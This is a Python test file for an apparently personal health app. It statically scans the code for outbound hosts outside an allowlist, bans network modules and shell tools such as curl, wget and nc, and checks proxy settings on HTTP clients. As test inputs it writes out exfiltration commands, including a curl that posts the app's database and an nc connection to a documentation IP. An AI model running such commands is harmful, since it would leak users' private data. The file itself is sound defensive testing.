"""Static egress allowlist.

Walks app/ and tools/ without importing them, so it passes on an empty tree and
on any tree whose only outbound hosts are Goodreads, the Anthropic API and the city panel's
three public feeds (MTA service alerts, Open-Meteo, the National Weather Service; see
workflows/city.md for what each request carries).
Health data stays home: any other host is a failing test.

Also banned in app/ and tools/: the network modules that bypass httpx (`requests`,
`urllib.request`, `socket`, `http.client`, `ftplib`, `smtplib`, `telnetlib`) and starting
`curl`, `wget` or `nc` through `subprocess` or `os.system`.

Limit: this is a static scan. A host assembled at runtime (joined from parts, read from a
file or the environment, decoded) is not a literal and cannot be caught here; that case
rests on review and on the adapters' own checks (the Pixoo adapter accepts LAN addresses
only).
"""

from __future__ import annotations

import ast
import ipaddress
import re
from dataclasses import dataclass
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent
SCAN_DIRS = ("app", "tools")

CITY_HOSTS = frozenset({"api-endpoint.mta.info", "api.open-meteo.com", "api.weather.gov"})
ALLOWED_HOSTS = frozenset({"www.goodreads.com", "goodreads.com", "api.anthropic.com"}) | CITY_HOSTS
LOOPBACK_HOSTS = frozenset({"127.0.0.1", "localhost", "0.0.0.0"})
LAN_NETWORKS = tuple(
    ipaddress.ip_network(net) for net in ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")
)

BANNED_IMPORTS = (
    ("requests",),
    ("urllib", "request"),
    ("socket",),
    ("http", "client"),
    ("ftplib",),
    ("smtplib",),
    ("telnetlib",),
)
BANNED_PROGRAMS = frozenset({"curl", "wget", "nc"})
# The one file allowed `socket`: it reads this machine's own LAN address off a UDP socket
# connected (never written to) towards the panel, whose address `require_lan_host` has
# already confined to the home network. `test_the_served_module_only_connects_to_the_lan`
# pins that use.
SOCKET_EXEMPT = ("app/render/adapters/served.py",)
PROCESS_CALLS = frozenset(
    {"run", "Popen", "call", "check_call", "check_output", "system", "popen", "getoutput"}
)

NETWORK_MARKERS = (
    "httpx",
    "requests",
    "urllib",
    "urlopen",
    "AsyncClient",
    "Client",
    "get",
    "post",
    "put",
    "stream",
    "request",
)

URL_RE = re.compile(r"https?://([^/\s\"'<>\\?#]+)", re.IGNORECASE)
HOSTNAME_RE = re.compile(r"^(?:[a-z0-9-]+\.)+[a-z]{2,}$", re.IGNORECASE)
IPV4_RE = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}$")


@dataclass(frozen=True)
class Violation:
    path: Path
    line: int
    kind: str
    detail: str

    def __str__(self) -> str:
        return f"{self.path}:{self.line}: {self.kind}: {self.detail}"


def host_from_url(url: str) -> str | None:
    match = URL_RE.search(url)
    if not match:
        return None
    netloc = match.group(1)
    netloc = netloc.rsplit("@", 1)[-1]
    return netloc.split(":", 1)[0].lower()


def is_lan_address(host: str) -> bool:
    """A literal IPv4 address in a private range, the Pixoo adapter's `require_lan_host`
    rule. A hostname that merely starts like one ("192.168.evil.example.com") is not."""
    try:
        address = ipaddress.IPv4Address(host)
    except ValueError:
        return False
    return any(address in network for network in LAN_NETWORKS)


def host_allowed(host: str) -> bool:
    return host in ALLOWED_HOSTS or host in LOOPBACK_HOSTS or is_lan_address(host)


def looks_like_host(value: str) -> bool:
    return bool(HOSTNAME_RE.match(value) or IPV4_RE.match(value))


def _dotted_name(node: ast.AST) -> str:
    parts: list[str] = []
    while isinstance(node, ast.Attribute):
        parts.append(node.attr)
        node = node.value
    if isinstance(node, ast.Name):
        parts.append(node.id)
    return ".".join(reversed(parts))


def _is_network_call(call: ast.Call) -> bool:
    name = _dotted_name(call.func)
    if not name:
        return False
    segments = name.split(".")
    return any(seg in NETWORK_MARKERS for seg in segments) and (
        segments[0] in ("httpx", "requests", "urllib", "client", "self")
        or "urlopen" in segments
        or segments[-1] in ("AsyncClient", "Client")
    )


def _docstring_nodes(tree: ast.AST) -> set[int]:
    ids: set[int] = set()
    for node in ast.walk(tree):
        if isinstance(node, (ast.Module, ast.ClassDef, ast.FunctionDef, ast.AsyncFunctionDef)):
            body = getattr(node, "body", [])
            if body and isinstance(body[0], ast.Expr):
                value = body[0].value
                if isinstance(value, ast.Constant) and isinstance(value.value, str):
                    ids.add(id(value))
    return ids


def _banned_import(node: ast.AST) -> str | None:
    if isinstance(node, ast.Import):
        for alias in node.names:
            parts = tuple(alias.name.split("."))
            for banned in BANNED_IMPORTS:
                if parts[: len(banned)] == banned:
                    return alias.name
    if isinstance(node, ast.ImportFrom) and node.module:
        parts = tuple(node.module.split("."))
        for banned in BANNED_IMPORTS:
            if parts[: len(banned)] == banned:
                return node.module
        for alias in node.names:
            if (*parts, alias.name) in BANNED_IMPORTS:
                return f"{node.module}.{alias.name}"
    return None


def _banned_program(call: ast.Call) -> str | None:
    """`curl`, `wget` or `nc` as the program of a subprocess/os.system style call."""
    name = _dotted_name(call.func)
    if not name or name.split(".")[-1] not in PROCESS_CALLS:
        return None
    command = next((kw.value for kw in call.keywords if kw.arg == "args"), None)
    if command is None and call.args:
        command = call.args[0]
    if isinstance(command, ast.List | ast.Tuple) and command.elts:
        command = command.elts[0]
    if not (isinstance(command, ast.Constant) and isinstance(command.value, str)):
        return None
    words = command.value.split()
    program = words[0].rsplit("/", 1)[-1] if words else ""
    return program if program in BANNED_PROGRAMS else None


def _scan_source_regex(path: Path, text: str) -> list[Violation]:
    found: list[Violation] = []
    for lineno, line in enumerate(text.splitlines(), start=1):
        for match in URL_RE.finditer(line):
            host = host_from_url(match.group(0))
            if host and not host_allowed(host):
                found.append(Violation(path, lineno, "url", host))
    return found


def scan_file(path: Path) -> list[Violation]:
    text = path.read_text(encoding="utf-8", errors="replace")
    try:
        tree = ast.parse(text, filename=str(path))
    except SyntaxError:
        return _scan_source_regex(path, text)

    found: list[Violation] = []
    docstrings = _docstring_nodes(tree)

    for node in ast.walk(tree):
        banned = _banned_import(node)
        if banned == "socket" and path.as_posix().endswith(SOCKET_EXEMPT):
            continue
        if banned:
            found.append(Violation(path, node.lineno, "import", f"{banned} (use httpx)"))

        if isinstance(node, ast.Constant) and isinstance(node.value, str):
            if id(node) in docstrings:
                continue
            for match in URL_RE.finditer(node.value):
                host = host_from_url(match.group(0))
                if host and not host_allowed(host):
                    found.append(Violation(path, node.lineno, "url", host))

        if isinstance(node, ast.Call):
            program = _banned_program(node)
            if program:
                found.append(Violation(path, node.lineno, "subprocess", program))

        if isinstance(node, ast.Call) and _is_network_call(node):
            values = list(node.args) + [kw.value for kw in node.keywords]
            for value in values:
                for sub in ast.walk(value):
                    if not (isinstance(sub, ast.Constant) and isinstance(sub.value, str)):
                        continue
                    literal = sub.value.strip()
                    if URL_RE.search(literal):
                        continue
                    if looks_like_host(literal) and not host_allowed(literal.lower()):
                        found.append(Violation(path, sub.lineno, "host", literal))
    return found


def scan_tree(root: Path, subdirs: tuple[str, ...] = SCAN_DIRS) -> list[Violation]:
    found: list[Violation] = []
    for sub in subdirs:
        base = root / sub
        if not base.is_dir():
            continue
        for path in sorted(base.rglob("*.py")):
            if any(part in ("__pycache__", ".venv") for part in path.parts):
                continue
            found.extend(scan_file(path))
    return found


def test_egress_allowlist_holds_on_repo() -> None:
    violations = scan_tree(REPO_ROOT)
    assert not violations, "outbound hosts outside the allowlist:\n" + "\n".join(
        str(v) for v in violations
    )


def test_gate_catches_unlisted_host(tmp_path: Path) -> None:
    pkg = tmp_path / "app" / "ingest"
    pkg.mkdir(parents=True)
    (pkg / "leak.py").write_text(
        'import httpx\n\ndef pull():\n    return httpx.get("https://example.com/x")\n',
        encoding="utf-8",
    )
    violations = scan_tree(tmp_path)
    assert [v.kind for v in violations] == ["url"]
    assert violations[0].detail == "example.com"
    assert violations[0].line == 4


def test_gate_catches_bare_host_and_banned_import(tmp_path: Path) -> None:
    pkg = tmp_path / "tools"
    pkg.mkdir()
    (pkg / "leak.py").write_text(
        "import requests\nfrom urllib import request\n\n"
        'requests.get("http://127.0.0.1:8080/healthz")\n'
        'client = httpx.Client(base_url="https://api.anthropic.com")\n'
        'client.get("evil.example.org")\n',
        encoding="utf-8",
    )
    violations = scan_tree(tmp_path)
    kinds = sorted(v.kind for v in violations)
    assert kinds == ["host", "import", "import"]
    assert {v.detail for v in violations if v.kind == "import"} == {
        "requests (use httpx)",
        "urllib.request (use httpx)",
    }
    assert [v.detail for v in violations if v.kind == "host"] == ["evil.example.org"]


def test_allowlisted_and_lan_hosts_pass(tmp_path: Path) -> None:
    pkg = tmp_path / "app"
    pkg.mkdir()
    (pkg / "ok.py").write_text(
        '"""Docs may cite https://help.healthyapps.dev without failing the gate."""\n'
        "import httpx\n\n"
        'RSS = "https://www.goodreads.com/review/list_rss/1"\n'
        'API = "https://api.anthropic.com/v1/messages"\n'
        'LAN = "http://192.168.1.171:8080/ingest/health"\n'
        'LOCAL = "http://127.0.0.1:8080/healthz"\n'
        'httpx.get("http://localhost:8080/healthz")\n',
        encoding="utf-8",
    )
    assert scan_tree(tmp_path) == []


def test_city_feeds_pass_and_their_lookalikes_do_not(tmp_path: Path) -> None:
    from app.city import fetch

    assert fetch.ALLOWED_HOSTS == CITY_HOSTS, "the code's allowlist and the gate's must agree"
    ok = "".join(f'httpx.get("https://{host}/x")\n' for host in sorted(CITY_HOSTS))
    assert _scan_one(tmp_path / "ok", "app/city", "import httpx\n\n" + ok) == []
    lookalikes = (
        "api.mta.info",
        "mta.info",
        "api-endpoint.mta.info.example.com",
        "open-meteo.com",
        "customer-api.open-meteo.com",
        "weather.gov",
        "api.weather.com",
        "api.weather.gov.example.net",
    )
    for host in lookalikes:
        assert not host_allowed(host), host
        violations = _scan_one(
            tmp_path / host, "app/city", f'import httpx\n\nhttpx.get("https://{host}/x")\n'
        )
        assert [(v.kind, v.detail) for v in violations] == [("url", host)]


def test_a_hostname_that_starts_like_a_lan_address_is_not_a_lan_host(tmp_path: Path) -> None:
    for host in ("192.168.evil.example.com", "192.168.1.5.example.com", "10.evil.example.com"):
        assert not host_allowed(host), host
        violations = _scan_one(
            tmp_path / host, "app", f'import httpx\n\nhttpx.get("https://{host}/x")\n'
        )
        assert [(v.kind, v.detail) for v in violations] == [("url", host)]
    for host in ("192.168.1.171", "10.0.0.7", "172.16.4.2"):
        assert host_allowed(host), host
    for host in ("172.32.0.1", "192.169.1.1", "8.8.8.8", "192.168.1"):
        assert not host_allowed(host), host


def _scan_one(tmp_path: Path, folder: str, source: str) -> list[Violation]:
    pkg = tmp_path / folder
    pkg.mkdir(parents=True, exist_ok=True)
    (pkg / "leak.py").write_text(source, encoding="utf-8")
    return scan_tree(tmp_path)


def test_gate_catches_network_modules_that_bypass_httpx(tmp_path: Path) -> None:
    mutants = {
        'import socket\n\nsocket.create_connection(("metrics.example.net", 443))\n': "socket",
        "from socket import create_connection\n": "socket",
        'import http.client\n\nhttp.client.HTTPSConnection("metrics.example.net")\n': (
            "http.client"
        ),
        "from http import client\n": "http.client",
        "from http.client import HTTPSConnection\n": "http.client",
        "import ftplib\n": "ftplib",
        "import smtplib\n": "smtplib",
        "from telnetlib import Telnet\n": "telnetlib",
    }
    for index, (source, module) in enumerate(mutants.items()):
        violations = _scan_one(tmp_path / str(index), "app/jobs", source)
        imports = [v.detail for v in violations if v.kind == "import"]
        assert imports == [f"{module} (use httpx)"], source


def test_gate_catches_curl_wget_and_nc_started_as_subprocesses(tmp_path: Path) -> None:
    mutants = {
        'import subprocess\n\nsubprocess.run(["curl", "-T", "x", "ftp://backup.example.net/"])\n': (
            "curl"
        ),
        'import subprocess\n\nsubprocess.Popen(["/usr/bin/wget", "-q", "-O-", "x"])\n': "wget",
        'import subprocess\n\nsubprocess.check_output("nc 203.0.113.9 9000", shell=True)\n': "nc",
        'import os\n\nos.system("curl -s -d @data/life.db 203.0.113.9")\n': "curl",
    }
    for index, (source, program) in enumerate(mutants.items()):
        violations = _scan_one(tmp_path / str(index), "tools", source)
        assert [v.detail for v in violations if v.kind == "subprocess"] == [program], source


def test_starting_our_own_python_is_not_a_violation(tmp_path: Path) -> None:
    source = (
        "import subprocess\nimport sys\n\n"
        'subprocess.Popen([sys.executable, "-m", "tools.drill", "--child", "nc"])\n'
        'subprocess.run(["sqlite3", "data/life.db", "PRAGMA integrity_check"])\n'
    )
    assert _scan_one(tmp_path, "tools", source) == []


def test_the_served_module_only_connects_to_the_lan() -> None:
    from app.render.adapters import served

    source = (REPO_ROOT / SOCKET_EXEMPT[0]).read_text(encoding="utf-8")
    assert source.count("socket.socket(") == 1 and "SOCK_DGRAM" in source, "one UDP socket"
    assert "sendto" not in source and "sendall" not in source and "create_connection" not in source
    for host in ("8.8.8.8", "pixoo.example.com", "127.0.0.1"):
        with pytest.raises(ValueError):
            served.own_address(host)


_HTTPX_CLIENT = re.compile(r"httpx\.(?:Async)?Client\((?P<args>[^)]*)\)")


def httpx_clients_trusting_env(root: Path) -> list[str]:
    """Every `httpx.Client(` / `httpx.AsyncClient(` under app/ whose arguments do not carry
    `trust_env=False`; a proxy set in the environment would otherwise route the LAN-only
    service's requests through it. The Anthropic SDK's own clients are not httpx
    constructions here and are not checked."""
    found: list[str] = []
    for path in sorted((root / "app").rglob("*.py")):
        if any(part in ("__pycache__", ".venv") for part in path.parts):
            continue
        for lineno, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
            for match in _HTTPX_CLIENT.finditer(line):
                if "trust_env=False" not in match.group("args"):
                    found.append(f"{path.relative_to(root)}:{lineno}: {line.strip()}")
    return found


def test_every_httpx_client_in_app_ignores_proxy_environment() -> None:
    assert httpx_clients_trusting_env(REPO_ROOT) == []


def test_httpx_proxy_gate_catches_a_client_without_trust_env(tmp_path: Path) -> None:
    (tmp_path / "app").mkdir()
    (tmp_path / "app" / "x.py").write_text(
        "import httpx\nc = httpx.Client(timeout=5)\nd = httpx.AsyncClient(trust_env=False)\n"
    )
    assert httpx_clients_trusting_env(tmp_path) == ["app/x.py:2: c = httpx.Client(timeout=5)"]
